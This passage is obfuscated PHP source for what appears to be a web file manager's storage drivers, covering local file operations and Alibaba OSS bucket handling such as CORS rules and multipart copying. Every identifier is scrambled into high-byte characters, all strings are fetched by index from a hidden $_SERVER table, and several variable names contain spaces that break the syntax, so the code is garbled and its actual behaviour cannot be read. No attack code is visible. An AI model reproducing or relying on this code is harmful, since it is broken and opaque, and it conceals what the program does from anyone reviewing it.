$Š©–¥¼— =& $_SERVER[Ö†ØøÖ±]; $ƒ›¨ÁëÅ = $this->iconvApp($this->pathBase); $ğĞ÷·à = $this->iconvApp($ğĞ÷·à); if (substr($ƒ›¨ÁëÅ, 0, 2) == $Š©–¥¼—[1406]) { $ƒ›¨ÁëÅ = BASIC_PATH . substr($ƒ›¨ÁëÅ, 2); } if (substr($ğĞ÷·à, 0, 2) == $Š©–¥¼—[1406]) { $ğĞ÷·à = BASIC_PATH . substr($ğĞ÷·à, 2); } $ƒ›¨ÁëÅ = KodIO::clear($ƒ›¨ÁëÅ); $ğĞ÷·à = KodIO::clear($ğĞ÷·à); $ğĞ÷·à = substr($ğĞ÷·à, strlen($ƒ›¨ÁëÅ)); if (empty($this->pathDriver)) { return $ğĞ÷·à; } return $this->pathDriver . $Š©–¥¼—[8] . ltrim($ğĞ÷·à, $Š©–¥¼—[8]); } public function mkfile($Í÷Ë–œ, $şÇøö‘à = '', $‰ØÈÚàé = REPEAT_RENAME) { $Í÷Ë–œ = $this->iconvSystem($Í÷Ë–œ); @touch($Í÷Ë–œ); if ($şÇøö‘à) { file_put_contents($Í÷Ë–œ, $şÇøö‘à); } @chmod($Í÷Ë–œ, $this->pathAuth); return is_file($Í÷Ë–œ) ? $this->getPathOuter($Í÷Ë–œ) : !1; } public function mkdir($‚È¶Šı¢, $±¿Ì¹ã® = REPEAT_SKIP) { $‚È¶Šı¢ = $this->iconvSystem($‚È¶Šı¢); if (is_dir($‚È¶Šı¢)) { return $this->getPathOuter($‚È¶Šı¢); } @mkdir($‚È¶Šı¢, $this->pathAuth, !0); @chmod($‚È¶Šı¢, $this->pathAuth); return is_dir($‚È¶Šı¢) ? $this->getPathOuter($‚È¶Šı¢) : !1; } public function copyFile($ôÜ‡İ¬Î, $ÅØø¿Å) { $this->mkdir($this->pathFather($ÅØø¿Å)); $ôÜ‡İ¬Î = $this->iconvSystem($ôÜ‡İ¬Î); $ÅØø¿Å = $this->iconvSystem($ÅØø¿Å); $ËÍéÍÄ¯ = copy_64($ôÜ‡İ¬Î, $ÅØø¿Å); @chmod($ÅØø¿Å, $this->pathAuth); return $ËÍéÍÄ¯ ? $this->getPathOuter($ÅØø¿Å) : !1; } public function moveFile($‡¶·ã«ê, $­À˜ëğó) { $this->mkdir($this->pathFather($­À˜ëğó)); $‡¶·ã«ê = $this->iconvSystem($‡¶·ã«ê); $­À˜ëğó = $this->iconvSystem($­À˜ëğó); $êÙà‡­½ = intval(@rename($‡¶·ã«ê, $­À˜ëğó)); if (!$êÙà‡­½) { if ($êÙà‡­½ = intval(@copy_64($‡¶·ã«ê, $­À˜ëğó))) { @unlink($‡¶·ã«ê); } } @chmod($­À˜ëğó, $this->pathAuth); return $êÙà‡­½ ? $this->getPathOuter($­À˜ëğó) : !1; } public function movePath($¢ñ€Áğ, $Š¦Ò“‡É, $å½ö¬ÎÓ = false) { $„û‚¼ ù =& $_SERVER[Ö†ØøÖ±]; $¢ñ€Áğ = $this->iconvSystem($¢ñ€Áğ); $Š¦Ò“‡É = $this->iconvSystem($Š¦Ò“‡É); $Êéï‰ç = rtrim($Š¦Ò“‡É, $„û‚¼ ù[8]) . $„û‚¼ ù[8] . ($å½ö¬ÎÓ ? $å½ö¬ÎÓ : get_path_this($¢ñ€Áğ)); if (file_exists($Êéï‰ç)) { return !1; } $ ”£Ğ = intval(@rename($¢ñ€Áğ, $Êéï‰ç)); $ ”£Ğ = file_exists($Êéï‰ç); return $ ”£Ğ ? $this->getPathOuter($Êéï‰ç) : !1; } public function delFile($ŞçòĞ¶) { $ŞçòĞ¶ = $this->iconvSystem($ŞçòĞ¶); if (!@unlink($ŞçòĞ¶)) { @chmod($ŞçòĞ¶, $this->pathAuth); if (!@unlink($ŞçòĞ¶)) { return !1; } } else { return !0; } } public function delFolder($¬¼Ğ¡) { $±ÜÍ¬äİ =& $_SERVER[Ö†ØøÖ±]; $¬¼Ğ¡ = $this->iconvSystem($¬¼Ğ¡); if (!is_dir($¬¼Ğ¡)) { return !0; } if (!($óô§ÊŠƒ = opendir($¬¼Ğ¡))) { return !1; } while (($Ë©¿Ê„ = readdir($óô§ÊŠƒ)) !== !1) { if ($Ë©¿Ê„ == $±ÜÍ¬äİ[10] || $Ë©¿Ê„ == $±ÜÍ¬äİ[1331]) { continue; } $ß§›Å‘ = $¬¼Ğ¡ . $±ÜÍ¬äİ[8] . $Ë©¿Ê„; if (is_file($ß§›Å‘) || is_link($ß§›Å‘)) { if (!unlink($ß§›Å‘)) { chmod($ß§›Å‘, $this->pathAuth); if (!unlink($ß§›Å‘)) { return !1; } } } else { if (is_dir($ß§›Å‘)) { chmod($ß§›Å‘, $this->pathAuth); $ß§›Å‘ = $this->iconvApp($ß§›Å‘); if (!$this->delFolder($ß§›Å‘)) { return !1; } } } } closedir($óô§ÊŠƒ); return rmdir($¬¼Ğ¡); } public function rename($ëÓÕ²ì¾, $ñŸ¤ìÑ­) { $ô—Á­°ô =& $_SERVER[Ö†ØøÖ±]; $‚´¶¬ôô = $this->fileNameAuto($this->pathFather($ëÓÕ²ì¾), $ñŸ¤ìÑ­); $‚´¶¬ôô = $this->iconvSystem($‚´¶¬ôô); $ëÓÕ²ì¾ = $this->iconvSystem($ëÓÕ²ì¾); $’—İŒ‘Í = $this->pathFather($ëÓÕ²ì¾); $ ŠÛ†¾× = rtrim($’—İŒ‘Í, $ô—Á­°ô[8]) . $ô—Á­°ô[8] . $‚´¶¬ôô; $¼€¨ù = @rename($ëÓÕ²ì¾, $ ŠÛ†¾×); $ ŠÛ†¾× = $this->iconvApp($ ŠÛ†¾×); return $¼€¨ù ? $this->getPathOuter($ ŠÛ†¾×) : !1; } public function size($¿µÉß‘) { $¿µÉß‘ = $this->iconvSystem($¿µÉß‘); return filesize_64($¿µÉß‘); } public function info($ğ¦óê§) { $ğ¦óê§ = $this->iconvSystem($ğ¦óê§); if ($this->isFolder($ğ¦óê§)) { return $this->folderInfo($ğ¦óê§); } else { if ($this->isFile($ğ¦óê§)) { return $this->fileInfo($ğ¦óê§); } } return !1; } protected function infoChildren($û’ôÍÅï, &$«Îíıûµ, $€¤Ë•ì = true) { $¨Œ°™¡ =& $_SERVER[Ö†ØøÖ±]; check_abort_echo(); $û’ôÍÅï = rtrim($û’ôÍÅï, $¨Œ°™¡[8]) . $¨Œ°™¡[8]; if ($€¤Ë•ì) { $û’ôÍÅï = $this->iconvSystem($û’ôÍÅï); } if (!($áµÈÔµâ = @opendir($û’ôÍÅï))) { return; } while (($õãòÏù = readdir($áµÈÔµâ)) !== !1) { if ($õãòÏù == $¨Œ°™¡[10] || $õãòÏù == $¨Œ°™¡[1331]) { continue; } $˜ÛöÈŞÌ = $û’ôÍÅï . $õãòÏù; if (is_file($˜ÛöÈŞÌ) || is_link($˜ÛöÈŞÌ)) { $«Îíıûµ[$¨Œ°™¡[77]]++; $«Îíıûµ[$¨Œ°™¡[76]] += filesize_64($˜ÛöÈŞÌ); } else { if (is_dir($˜ÛöÈŞÌ)) { $«Îíıûµ[$¨Œ°™¡[78]]++; $this->infoChildren($˜ÛöÈŞÌ, $«Îíıûµ, !1); } } } closedir($áµÈÔµâ); } private function folderInfo($»¼‘ˆ†Ï, $ßíÜáğ¬ = false) { $æ¼¾ —ä =& $_SERVER[Ö†ØøÖ±]; $»¼‘ˆ†Ï = rtrim($»¼‘ˆ†Ï, $æ¼¾ —ä[8]) . $æ¼¾ —ä[8]; $š€Îíğš = $this->iconvApp($this->pathThis($»¼‘ˆ†Ï)); if ($ßíÜáğ¬) { return array($æ¼¾ —ä[32] => $š€Îíğš, $æ¼¾ —ä[84] => $this->getPathOuter($»¼‘ˆ†Ï), $æ¼¾ —ä[33] => $æ¼¾ —ä[75]); } $³±«ĞĞä = array($æ¼¾ —ä[32] => $š€Îíğš, $æ¼¾ —ä[84] => $this->getPathOuter($»¼‘ˆ†Ï), $æ¼¾ —ä[33] => $æ¼¾ —ä[75], $æ¼¾ —ä[215] => @filectime($»¼‘ˆ†Ï), $æ¼¾ —ä[85] => @filemtime($»¼‘ˆ†Ï), $æ¼¾ —ä[1415] => @fileatime($»¼‘ˆ†Ï), $æ¼¾ —ä[1416] => is_readable($»¼‘ˆ†Ï), $æ¼¾ —ä[1417] => is_writable($»¼‘ˆ†Ï), $æ¼¾ —ä[1418] => get_mode($»¼‘ˆ†Ï)); return $³±«ĞĞä; } private function fileInfo($¨²•Àá, $à½«õ« = false) { $Æ†«™ì÷ =& $_SERVER[Ö†ØøÖ±]; $­¯ÜÅ”» = $this->iconvApp($this->pathThis($¨²•Àá)); if ($à½«õ«) { return array($Æ†«™ì÷[32] => $­¯ÜÅ”», $Æ†«™ì÷[84] => $this->getPathOuter($¨²•Àá), $Æ†«™ì÷[33] => $Æ†«™ì÷[214], $Æ†«™ì÷[76] => $this->size($¨²•Àá), $Æ†«™ì÷[175] => $this->ext($­¯ÜÅ”»)); } $¯È­öÚú = array($Æ†«™ì÷[32] => $­¯ÜÅ”», $Æ†«™ì÷[84] => $this->getPathOuter($¨²•Àá), $Æ†«™ì÷[33] => $Æ†«™ì÷[214], $Æ†«™ì÷[215] => @filectime($¨²•Àá), $Æ†«™ì÷[85] => @filemtime($¨²•Àá), $Æ†«™ì÷[1415] => @fileatime($¨²•Àá), $Æ†«™ì÷[76] => $this->size($¨²•Àá), $Æ†«™ì÷[175] => $this->ext($­¯ÜÅ”»), $Æ†«™ì÷[1416] => is_readable($¨²•Àá), $Æ†«™ì÷[1417] => is_writable($¨²•Àá), $Æ†«™ì÷[1418] => get_mode($¨²•Àá)); return $¯È­öÚú; } public function exist($ù©¦õ§å) { $ù©¦õ§å = $this->iconvSystem($ù©¦õ§å); return @file_exists($ù©¦õ§å); } public function isFile($­²ÊÔ÷) { $­²ÊÔ÷ = $this->iconvSystem($­²ÊÔ÷); return @is_file($­²ÊÔ÷); } public function isFolder($æ²ƒÔ¥±) { $æ²ƒÔ¥± = $this->iconvSystem($æ²ƒÔ¥±); return @is_dir($æ²ƒÔ¥±); } public function listPath($ßôô”ªÉ, $ÁŠ“’»Ù = false) { $¨Ò†¡• =& $_SERVER[Ö†ØøÖ±]; $ßôô”ªÉ = $this->iconvSystem($ßôô”ªÉ); $ßôô”ªÉ = rtrim($ßôô”ªÉ, $¨Ò†¡•[8]) . $¨Ò†¡•[8]; $ŸáŞûóİ = array($¨Ò†¡•[82] => array(), $¨Ò†¡•[83] => array()); if (!($Ø«Ÿ§¹– = @opendir($ßôô”ªÉ))) { return $ŸáŞûóİ; } while (($Şãû–ê¡ = readdir($Ø«Ÿ§¹–)) !== !1) { if ($Şãû–ê¡ == $¨Ò†¡•[10] || $Şãû–ê¡ == $¨Ò†¡•[1331]) { continue; } $¤İ–ê¢ = $ßôô”ªÉ . $Şãû–ê¡; if (is_file($¤İ–ê¢)) { $ŸáŞûóİ[$¨Ò†¡•[83]][] = $this->fileInfo($¤İ–ê¢, $ÁŠ“’»Ù); } else { $ŸáŞûóİ[$¨Ò†¡•[82]][] = $this->folderInfo($¤İ–ê¢, $ÁŠ“’»Ù); } } closedir($Ø«Ÿ§¹–); return $ŸáŞûóİ; } public function listAll($µ±¾´¤, &$‡ˆœâÔ— = array()) { $İ»€÷¨” =& $_SERVER[Ö†ØøÖ±]; $µ±¾´¤ = $this->iconvSystem($µ±¾´¤); $µ±¾´¤ = rtrim($µ±¾´¤, $İ»€÷¨”[8]) . $İ»€÷¨”[8]; if (!($µ£á’»û = @opendir($µ±¾´¤))) { return $‡ˆœâÔ—; } while (($ğ¡éÛÌË = readdir($µ£á’»û)) !== !1) { if ($ğ¡éÛÌË == $İ»€÷¨”[10] || $ğ¡éÛÌË == $İ»€÷¨”[1331]) { continue; } $¾›Ä…»‡ = $µ±¾´¤ . $ğ¡éÛÌË; $…×ˆéÉİ = is_dir($¾›Ä…»‡) && !is_link($¾›Ä…»‡) ? 1 : 0; $¾›Ä…»‡ = $…×ˆéÉİ ? $¾›Ä…»‡ . $İ»€÷¨”[8] : $¾›Ä…»‡; $‡ˆœâÔ—[] = array($İ»€÷¨”[84] => $¾›Ä…»‡, $İ»€÷¨”[75] => $…×ˆéÉİ, $İ»€÷¨”[85] => intval(@filemtime($¾›Ä…»‡)), $İ»€÷¨”[76] => $…×ˆéÉİ ? 0 : intval($this->size($¾›Ä…»‡))); if ($…×ˆéÉİ) { $this->listAll($¾›Ä…»‡, $‡ˆœâÔ—); } } closedir($µ£á’»û); return $‡ˆœâÔ—; } public function has($ÙØÛÅñú, $ç”öûéş = false, $ª€¼ÄÉˆ = true) { $…—²î“ñ =& $_SERVER[Ö†ØøÖ±]; $ÙØÛÅñú = $this->iconvSystem($ÙØÛÅñú); $ÙØÛÅñú = rtrim($ÙØÛÅñú, $…—²î“ñ[8]) . $…—²î“ñ[8]; if (!($°óÍÈó² = @opendir($ÙØÛÅñú))) { return !1; } $¢Ú³§Óá = 0; $ˆ»›ê‘” = 0; $×û›ä‡‘ = 0; while (($ …£àÚ» = readdir($°óÍÈó²)) !== !1) { if ($ …£àÚ» == $…—²î“ñ[10] || $ …£àÚ» == $…—²î“ñ[1331]) { continue; } $ó¼³‘µÅ = $ÙØÛÅñú . $ …£àÚ»; if ($ç”öûéş) { $×û›ä‡‘++; if (@is_file($ó¼³‘µÅ)) { $¢Ú³§Óá++; } else { $ˆ»›ê‘”++; } if ($×û›ä‡‘ > 10000) { break; } continue; } if ($ª€¼ÄÉˆ) { if (@is_file($ó¼³‘µÅ)) { return !0; } } else { if (@is_dir($ó¼³‘µÅ . $…—²î“ñ[8])) { return !0; } } } closedir($°óÍÈó²); if ($ç”öûéş) { return array($…—²î“ñ[223] => $¢Ú³§Óá, $…—²î“ñ[224] => $ˆ»›ê‘”); } return !1; } public function hashSimple($€‰¬·«) { $¸ù¹ÛÉà =& $_SERVER[Ö†ØøÖ±]; if (!$€‰¬·«) { return md5($¸ù¹ÛÉà[12]); } $€‰¬·« = $this->iconvSystem($€‰¬·«); $í·Úêâ = $this->size($€‰¬·«); $ú¥±Éìà = 200; $ëøÆ¨„İ = 50; if ($í·Úêâ <= $ú¥±Éìà * $ëøÆ¨„İ) { return $this->hashMd5($€‰¬·«) . $í·Úêâ; } $Í‚¢ğ¹ = $¸ù¹ÛÉà[12]; $®×«ù¤Ö = intval($í·Úêâ / $ëøÆ¨„İ); $†·±åİŒ = fopen($€‰¬·«, $¸ù¹ÛÉà[1419]); if (!$†·±åİŒ) { return $Í‚¢ğ¹; } for ($üàÑ³É¼ = 0; $üàÑ³É¼ < $ëøÆ¨„İ; $üàÑ³É¼++) { fseek_64($†·±åİŒ, $®×«ù¤Ö * $üàÑ³É¼); $Í‚¢ğ¹ .= fread($†·±åİŒ, $ú¥±Éìà); } fseek_64($†·±åİŒ, $í·Úêâ - $ú¥±Éìà); $Í‚¢ğ¹ .= fread($†·±åİŒ, $ú¥±Éìà); fclose($†·±åİŒ); return md5($Í‚¢ğ¹) . $í·Úêâ; } public function getContent($ùÊ™–ØÖ) { $ùÊ™–ØÖ = $this->iconvSystem($ùÊ™–ØÖ); return file_get_contents($ùÊ™–ØÖ); } public function setContent($´Ö€‹ùŠ, $•ñİ²õí = '') { $´Ö€‹ùŠ = $this->iconvSystem($´Ö€‹ùŠ); $®ñÖ³Öä = @file_put_contents($´Ö€‹ùŠ, $•ñİ²õí, LOCK_EX); clearstatcache(); @chmod($´Ö€‹ùŠ, $this->pathAuth); return $®ñÖ³Öä === !1 ? !1 : !0; } public function fileSubstr($ÔËü¬·‹, $‚¦§•Ö£ = 0, $ºø¨äµ„ = false) { $¨€‡ëñ‰ =& $_SERVER[Ö†ØøÖ±]; $ÔËü¬·‹ = $this->iconvSystem($ÔËü¬·‹); if ($ºø¨äµ„ === !1) { $ºø¨äµ„ = $this->size($ÔËü¬·‹); } if ($ºø¨äµ„ <= 0) { return $¨€‡ëñ‰[12]; } $º¬íæã› = fopen($ÔËü¬·‹, $¨€‡ëñ‰[1419]); if (!$º¬íæã›) { return !1; } fseek_64($º¬íæã›, $‚¦§•Ö£); $†³—Ë  = fread($º¬íæã›, $ºø¨äµ„); fclose($º¬íæã›); return $†³—Ë ; } public function upload($©¯èÕîÆ, $ÌåÊÂÊö, $ô¼—‡Õ… = false, $Ïš‘íÕé = REPEAT_REPLACE) { if ($ô¼—‡Õ…) { return $this->moveFile($ÌåÊÂÊö, $©¯èÕîÆ); } return $this->copyFile($ÌåÊÂÊö, $©¯èÕîÆ); } public function setModifyTime($¯Ñ¼µ, $ıø´¯¨Ô = '') { @touch($¯Ñ¼µ, intval($ıø´¯¨Ô)); } public function download($ÂšœóˆØ, $à›ŠÓ²¸) { return $this->iconvSystem($ÂšœóˆØ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ö÷»’Ò) { parent::__construct($Ö÷»’Ò); $this->signatureVersion($_SERVER[Ö†ØøÖ±][231]); } public function fileOutLink($Œì™í×ì) { $Õ¸Á‚ä‚ =& $_SERVER[Ö†ØøÖ±]; if (substr($Œì™í×ì, 0, 7) == $Õ¸Á‚ä‚[1383]) { $Œì™í×ì = $Õ¸Á‚ä‚[1384] . substr($Œì™í×ì, 7); } header($Õ¸Á‚ä‚[162] . $Œì™í×ì); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ËÊ³¥¢œ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ö†ØøÖ±][1420]; $this->_init($ËÊ³¥¢œ); } public function _init($“™“ş¾) { $Œ†Ş¿«Ë =& $_SERVER[Ö†ØøÖ±]; $this->config = $“™“ş¾; foreach ($“™“ş¾ as $¶£–”±Ô => $ÙË›¸ãÛ) { if (isset($this->{$¶£–”±Ô})) { $this->{$¶£–”±Ô} = $ÙË›¸ãÛ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Œ†Ş¿«Ë[1421] . LNG($Œ†Ş¿«Ë[1422])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $â•´ÖĞ“ =& $_SERVER[Ö†ØøÖ±]; $ıÌÌš™ü = new OSS\Model\CorsConfig(); $¯ ñş£é = new OSS\Model\CorsRule(); $¯ ñş£é->addAllowedOrigin($â•´ÖĞ“[1423]); $¯ ñş£é->addAllowedMethod($â•´ÖĞ“[1424]); $¯ ñş£é->addAllowedMethod($â•´ÖĞ“[1425]); $¯ ñş£é->addAllowedMethod($â•´ÖĞ“[1426]); $¯ ñş£é->addAllowedMethod($â•´ÖĞ“[1427]); $¯ ñş£é->addAllowedMethod($â•´ÖĞ“[161]); $¯ ñş£é->setMaxAgeSeconds(600); $¯ ñş£é->addExposeHeader($â•´ÖĞ“[1428]); $¯ ñş£é->addAllowedHeader($â•´ÖĞ“[1423]); $ıÌÌš™ü->addRule($¯ ñş£é); try { $this->client->putBucketCors($this->bucket, $ıÌÌš™ü); } catch (OSS\Core\OssException $¬É–í¬Ô) { return !1; } return !0; } public function getBucketCors() { $èÜÒó±Æ =& $_SERVER[Ö†ØøÖ±]; $„¢÷‡íö = null; try { $„¢÷‡íö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ï³Ã«¦÷) { return null; } if (!$„¢÷‡íö || !($‚¥³ú¤ = $„¢÷‡íö->getRules())) { return null; } $Á“î‰¼ = $‚¥³ú¤[0]->getAllowedOrigins(); $¸Ù€›ã’ = $‚¥³ú¤[0]->getAllowedMethods(); $÷é—Í¬à = $‚¥³ú¤[0]->getMaxAgeSeconds(); $”á’ˆÂ” = $‚¥³ú¤[0]->getExposeHeaders(); $÷®€¬ğá = $‚¥³ú¤[0]->getAllowedHeaders(); return array($èÜÒó±Æ[202] => isset($Á“î‰¼[0]) ? $Á“î‰¼[0] : $èÜÒó±Æ[12], $èÜÒó±Æ[206] => $¸Ù€›ã’, $èÜÒó±Æ[1429] => $÷é—Í¬à, $èÜÒó±Æ[1430] => isset($”á’ˆÂ”[0]) ? $”á’ˆÂ”[0] : $èÜÒó±Æ[12], $èÜÒó±Æ[204] => isset($÷®€¬ğá[0]) ? $÷®€¬ğá[0] : $èÜÒó±Æ[12]); } public function isBucketCors() { $ÏŒíàÎ» =& $_SERVER[Ö†ØøÖ±]; $É¢¸Äâ³ = $this->getBucketCors(); if (!$É¢¸Äâ³ || !is_array($É¢¸Äâ³)) { return !1; } if ($É¢¸Äâ³[$ÏŒíàÎ»[202]] != $ÏŒíàÎ»[203] || $É¢¸Äâ³[$ÏŒíàÎ»[204]] != $ÏŒíàÎ»[203]) { return !1; } $ÑŞø‰ê = array_map($ÏŒíàÎ»[205], $É¢¸Äâ³[$ÏŒíàÎ»[206]]); if (!is_array($ÑŞø‰ê)) { $ÑŞø‰ê = array(); } $µ©ÖÙ¸Ò = array($ÏŒíàÎ»[207], $ÏŒíàÎ»[208], $ÏŒíàÎ»[209], $ÏŒíàÎ»[210], $ÏŒíàÎ»[211]); $Ñ¦„ö = array_diff($µ©ÖÙ¸Ò, $ÑŞø‰ê); return empty($Ñ¦„ö); } public function mkfile($é‡ªñå¸, $êÑóÇ¡¶ = '', $êŠ„¥ÅÚ = REPEAT_RENAME) { $åïõ´®è = $this->setContent($é‡ªñå¸, $êÑóÇ¡¶); if ($åïõ´®è !== !1) { return $this->getPathOuter($é‡ªñå¸); } return !1; } public function mkdir($–ìƒ¡”›, $«ƒóªà = REPEAT_SKIP) { if ($«ƒóªà && $this->_isFolder($–ìƒ¡”›)) { return $this->getPathOuter($–ìƒ¡”›); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($–ìƒ¡”›)); } catch (OSS\Core\OssException $Îï·ÈÄ ) { return !1; } return $this->getPathOuter($–ìƒ¡”›); } private function fileList($¿ò¾©™ı, $Êû‚ó¶ = '', $€µÎÅõ¶ = 0) { $ê¼¯µ‡¼ =& $_SERVER[Ö†ØøÖ±]; $¿ò¾©™ı = trim($¿ò¾©™ı, $ê¼¯µ‡¼[8]); $š¨Ïë¢ñ = empty($¿ò¾©™ı) && $¿ò¾©™ı !== $ê¼¯µ‡¼[212] ? $ê¼¯µ‡¼[12] : $¿ò¾©™ı . $ê¼¯µ‡¼[8]; $İ£Ñ Œ¡ = $ê¼¯µ‡¼[12]; $È¦ñ‰Ğ¢ = 1000; $ÀŸÑÌÀ = $•¢±ëöŠ = array(); while (!0) { check_abort(); $†•½Ëè« = array($ê¼¯µ‡¼[1431] => $Êû‚ó¶, $ê¼¯µ‡¼[1432] => $š¨Ïë¢ñ, $ê¼¯µ‡¼[1433] => $È¦ñ‰Ğ¢, $ê¼¯µ‡¼[1434] => $İ£Ñ Œ¡); try { $–¿™Ùşƒ = $this->client->listObjects($this->bucket, $†•½Ëè«); } catch (OSS\Core\OssException $ìæ‰×Í×) { break; } $İ£Ñ Œ¡ = $–¿™Ùşƒ->getNextMarker(); $Û£ÓøêÂ = $–¿™Ùşƒ->getObjectList(); $ÏöÖÚì = $–¿™Ùşƒ->getPrefixList(); foreach ($Û£ÓøêÂ as $«šÛçß) { if ($«šÛçß->getKey() == $š¨Ïë¢ñ) { continue; } $…œ®Ã¤ = $«šÛçß->getKey(); $•üò¦Ÿğ = $«šÛçß->getSize(); $ØÙşéØ = $«šÛçß->getLastModified(); $„´Û¢ŒÀ = trim($«šÛçß->getETag(), $ê¼¯µ‡¼[118]); $£¼”Ğæö = $€µÎÅõ¶ ? array($ê¼¯µ‡¼[32] => $…œ®Ã¤, $ê¼¯µ‡¼[76] => $•üò¦Ÿğ, $ê¼¯µ‡¼[194] => strtotime($ØÙşéØ), $ê¼¯µ‡¼[1435] => $„´Û¢ŒÀ) : $…œ®Ã¤; $Üœ¯ï­ñ = $•üò¦Ÿğ == 0 && substr($…œ®Ã¤, strlen($…œ®Ã¤) - 1, 1) == $ê¼¯µ‡¼[8] ? !0 : !1; $ùø–—»  = array($ê¼¯µ‡¼[76] => $•üò¦Ÿğ, $ê¼¯µ‡¼[1436] => $•üò¦Ÿğ, $ê¼¯µ‡¼[85] => strtotime($ØÙşéØ), $ê¼¯µ‡¼[1437] => $ØÙşéØ, $ê¼¯µ‡¼[1435] => $„´Û¢ŒÀ); $this->cacheMethodInfoSet($…œ®Ã¤, $Üœ¯ï­ñ, $ùø–—» ); if ($Üœ¯ï­ñ) { $ÀŸÑÌÀ[] = $…œ®Ã¤; continue; } $•¢±ëöŠ[] = $£¼”Ğæö; } foreach ($ÏöÖÚì as $Ù£Œµº›) { $ÀŸÑÌÀ[] = $Ù£Œµº›->getPrefix(); $this->cacheMethodInfoSet($Ù£Œµº›->getPrefix(), !0); } if ($İ£Ñ Œ¡ === $ê¼¯µ‡¼[12]) { break; } } $this->cacheMethodInfoSet($¿ò¾©™ı, !0); return array($ê¼¯µ‡¼[82] => $ÀŸÑÌÀ, $ê¼¯µ‡¼[83] => $•¢±ëöŠ); } public function copyFile($«„Áœ ù, $‡ºÔ¸á) { $ô½âŠÄ÷ = $this->size($«„Áœ ù); if ($ô½âŠÄ÷ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $«„Áœ ù, $this->bucket, $this->pathEncode($‡ºÔ¸á)); } catch (OSS\Core\OssException $¶£Ï×õÆ) { return !1; } return $this->getPathOuter($‡ºÔ¸á); } $±“¤¨Ë„ = $this->multiCopyObject($«„Áœ ù, $‡ºÔ¸á, $ô½âŠÄ÷); return $±“¤¨Ë„ ? $this->getPathOuter($‡ºÔ¸á) : !1; } private function multiCopyObject($“Ê–Áœè, $Š˜‡÷¤ø, $´Şáî¬) { $¢Ó¯Ä¥ =& $_SERVER[Ö†ØøÖ±]; try { $œÕ¾‰¼Ş = array(); if ($Åôö€Îâ = $this->hashMd5($“Ê–Áœè)) { $œÕ¾‰¼Ş = array(OSS\OssClient::OSS_HEADERS => array($¢Ó¯Ä¥[1438] => $Åôö€Îâ)); } $™ìûúö‘ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Š˜‡÷¤ø), $œÕ¾‰¼Ş); $…ó–ùó× = 1; $ÍºùåÊã = 0; $õû¬×êÊ = array(); $Ô©œÔš† = 1024 * 1024 * 10; $Âı˜½Ö© = $this->client->generateMultiuploadParts($´Şáî¬, $Ô©œÔš†); foreach ($Âı˜½Ö© as $¬Ş²×À => $“ â÷Ú†) { $µşÂşÏ = $ÍºùåÊã + (int) $“ â÷Ú†[$¢Ó¯Ä¥[1439]]; $Õ˜¹àÁñ = (int) $“ â÷Ú†[$¢Ó¯Ä¥[390]] + $µşÂşÏ - 1; $ã—µİ‚é = array($¢Ó¯Ä¥[1440] => $µşÂşÏ, $¢Ó¯Ä¥[1441] => $Õ˜¹àÁñ); $õû¬×êÊ[] = $this->client->uploadPartCopy($this->bucket, $“Ê–Áœè, $this->bucket, $this->pathEncode($Š˜‡÷¤ø), $…ó–ùó×, $™ìûúö‘, $ã—µİ‚é); $…ó–ùó× = $…ó–ùó× + 1; } $Š©ˆÙü = array(); foreach ($õû¬×êÊ as $¬Ş²×À => $¯î€„½Ş) { $Š©ˆÙü[] = array($¢Ó¯Ä¥[1442] => $¬Ş²×À + 1, $¢Ó¯Ä¥[1443] => $¯î€„½Ş); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Š˜‡÷¤ø), $™ìûúö‘, $Š©ˆÙü); } catch (OSS\Core\OssException $ª“äÜ½) { return !1; } return !0; } public function moveFile($Ù«ñ¯‡¦, $è­ÓÕ“ã) { if ($this->copyFile($Ù«ñ¯‡¦, $è­ÓÕ“ã)) { $this->remove($Ù«ñ¯‡¦); return $this->getPathOuter($è­ÓÕ“ã); } return !1; } public function delFile($Úå©Œ¦) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Úå©Œ¦)); } catch (OSS\Core\OssException $‰Ç¤å„ì) { return !1; } return !0; } public function delFolder($³®˜ÈèÃ) { $¿ãŠ‹è =& $_SERVER[Ö†ØøÖ±]; if (!$this->exist($³®˜ÈèÃ)) { return !0; } $this->listItemCache = !1; $’ïÊ–õ„ = $this->fileList($³®˜ÈèÃ); $this->listItemCache = !0; $îÈåÌ—Ç = trim($³®˜ÈèÃ, $¿ãŠ‹è[8]) . $¿ãŠ‹è[8]; if (!empty($³®˜ÈèÃ) && $³®˜ÈèÃ !== $¿ãŠ‹è[212] && !in_array($îÈåÌ—Ç, $’ïÊ–õ„[$¿ãŠ‹è[82]])) { $’ïÊ–õ„[$¿ãŠ‹è[82]][] = $îÈåÌ—Ç; } $Í®¬¯Ğ = $this->delByBatch($’ïÊ–õ„[$¿ãŠ‹è[83]]); if (!$Í®¬¯Ğ) { return !1; } $Í®¬¯Ğ = $this->delByBatch($’ïÊ–õ„[$¿ãŠ‹è[82]]); if (!$Í®¬¯Ğ) { return !1; } return $this->delFile($îÈåÌ—Ç); } private function delByBatch($¼³‘³£) { foreach (array_chunk($¼³‘³£, 1000) as $ê˜Ùõ×) { try { $this->client->deleteObjects($this->bucket, $ê˜Ùõ×); } catch (OSS\Core\OssException $¸®…³²€) { return !1; } } return !0; } public function rename($Øß‡ŠÒ¹, $°Òˆà™ä) { return $this->renameObject($Øß‡ŠÒ¹, $°Òˆà™ä); } private function fileInfo($Ö²ÌÈÂ, $äèÅÖÌù = false, $“Úø÷ßİ = array()) { $´Ì”´˜Õ =& $_SERVER[Ö†ØøÖ±]; $¿´Û´¢š = array($´Ì”´˜Õ[32] => $this->pathThis($Ö²ÌÈÂ), $´Ì”´˜Õ[84] => $this->getPathOuter($Ö²ÌÈÂ), $´Ì”´˜Õ[33] => 